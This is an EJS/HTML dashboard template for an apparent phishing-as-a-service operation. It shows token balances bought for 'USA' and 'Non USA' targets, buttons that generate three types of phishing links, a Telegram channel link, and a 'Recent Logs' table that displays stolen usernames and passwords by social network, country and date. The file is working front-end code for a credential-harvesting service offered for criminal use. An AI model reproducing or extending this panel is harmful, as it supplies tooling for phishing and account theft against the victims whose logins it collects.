<style>
  .panel-buttons a {
    display: inline-flex !important;
    align-items: center !important;
    justify-content: center !important;
    padding: 0.5em 1em !important;
  }
  .op {
    display: flex;
    align-items: center;
    margin-bottom: 1em;
  }
</style>

<div class="main-panel">
  <div class="content-wrapper">
    <a
      target="_blank"
      class="btn btn-primary"
      style="display: block"
      href="https://t.me/+kFAsCwWTgyw1YmVk"
      >Join our telegram channel</a
    >
    <br />
    <div class="row">
      <!-- Stats Cards Section - Consistent Colors -->
      <div class="col-xl-4 col-sm-6 grid-margin stretch-card">
        <div class="card" style="background: #191c24;">
          <div class="card-body">
            <div class="d-flex justify-content-between align-items-center mb-2">
              <h4 class="card-title mb-0">Token Balance</h4>
              <div class="icon icon-box-success">
                <span class="mdi mdi-cash icon-item"></span>
              </div>
            </div>
            <div class="d-flex align-items-center">
              <h2 class="mb-0 font-weight-bold"><%= req.user.tokens %></h2>
              <p class="ml-2 mb-0 text-muted">Non USA tokens</p>
            </div>
            <div class="d-flex align-items-center">
              <h2 class="mb-0 font-weight-bold"><%= req.user.usTokens %></h2>
              <p class="ml-2 mb-0 text-muted">USA tokens</p>
            </div>
            <div class="mt-3">
              <a href="/pricing" class="btn  mb-2 btn-success btn-sm">Buy Non USA Tokens</a>
              <a href="/pricing2" class="btn btn-success btn-sm">Buy USA Tokens</a>
            </div>
          </div>
        </div>
      </div>

      
      <div class="col-xl-4 col-sm-6 grid-margin stretch-card">
        <div class="card" style="background: #191c24;">
          <div class="card-body">
            <div class="d-flex justify-content-between align-items-center mb-2">
              <h4 class="card-title mb-0">Social Links</h4>
              <div class="icon icon-box-success">
                <span class="mdi mdi-link icon-item"></span>
              </div>
            </div>
            <div class="d-flex align-items-center">
              <h2 class="mb-0 font-weight-bold"><%= linkscount %></h2>
              <p class="ml-2 mb-0 text-muted">links</p>
            </div>
            <div class="mt-3">
              <a href="/links" class="btn btn-secondary btn-sm">View All</a>
            </div>
          </div>
        </div>
      </div>
      
      <!-- Quick Action Buttons - Improved Alignment -->
      <div class="col-12">
        <div class="d-flex justify-content-center flex-wrap mt-3 mb-4">
          <a href="/settings" class="btn btn-secondary btn-lg mx-2 my-2" style="min-width: 200px;">
            <i class="mdi mdi-settings mr-2"></i> Settings
          </a>
        </div>
      </div>
    </div>

    <!-- Link Generators Section - Improved Layout -->
    <div class="row mt-4 mb-4">
      <div class="col-12">
        <h4 class="card-title mb-3">Generate Phishing Links</h4>
      </div>
      
      <div class="col-md-4 mb-3">
        <div class="card" style="background: #191c24;">
          <div class="card-body p-3 d-flex align-items-center">
            <div class="mr-3">
              <img src="/link2.png" alt="Link Type 1" width="40" height="80" />
            </div>
            <div class="flex-grow-1">
              <h6 class="mb-2">Type 1</h6>
              <a href="/create-link" class="btn btn-success btn-block">
                <i class="mdi mdi-link-plus mr-1"></i> Generate Link
              </a>
            </div>
          </div>
        </div>
      </div>
      
      <div class="col-md-4 mb-3">
        <div class="card" style="background: #191c24;">
          <div class="card-body p-3 d-flex align-items-center">
            <div class="mr-3">
              <img src="/link1.png" alt="Link Type 2" width="40" height="80" />
            </div>
            <div class="flex-grow-1">
              <h6 class="mb-2">Type 2</h6>
              <a href="/create-link2" class="btn btn-danger btn-block">
                <i class="mdi mdi-link-plus mr-1"></i> Generate Link
              </a>
            </div>
          </div>
        </div>
      </div>
      
      <div class="col-md-4 mb-3">
        <div class="card" style="background: #191c24;">
          <div class="card-body p-3 d-flex align-items-center">
            <div class="mr-3">
              <img src="/link2.png" alt="Link Type 3" width="40" height="80" />
            </div>
            <div class="flex-grow-1">
              <h6 class="mb-2">Type 3 (Custom)</h6>
              <a href="/create-link3" class="btn btn-primary btn-block">
                <i class="mdi mdi-link-plus mr-1"></i> Generate Link
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="row text-white">
      <div class="col-12 grid-margin">
        <div class="card">
          <div class="card-body">
            <h4 class="card-title">Recent Logs</h4>
            <div class="table-responsive">
              <table class="table">
                <thead>
                  <tr>
                    <th class="text-white">Logs</th>
                    <th class="text-white">Social Media</th>
                    <th class="text-white">Country</th>
                    <th class="text-white">Link Name</th>
                    <th class="text-white">Date</th>
                  </tr>
                </thead>
                <tbody>
                  <% credentials.reverse().slice(0,11).forEach(c => {%>
                  <tr>
                    <td class="text-white">
                      <p class="text-white">
                        Username: <b><%= c.fields.username %></b>
                      </p>
                      <br />
                      <p class="text-white">
                        Password: <b><%= c.fields.password %></b>
                      </p>
                    </td>
                    <td class="text-white"><%= c.linkType %></td>
                    <td class="text-white"><%= c.country %></td>
                    <td class="text-white"><%= c.linkName %></td>
                    <td class="text-white">
                      <%= moment(c.date).format("MMM Do YY h:mm a") %>
                    </td>
                  </tr>
                  <%})%>
                </tbody>
              </table>

              <% if(credentialscount > 10){%>
              <div>
                <a href="/credentials" class="btn btn-secondary">See all</a>
              </div>
              <%}%>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
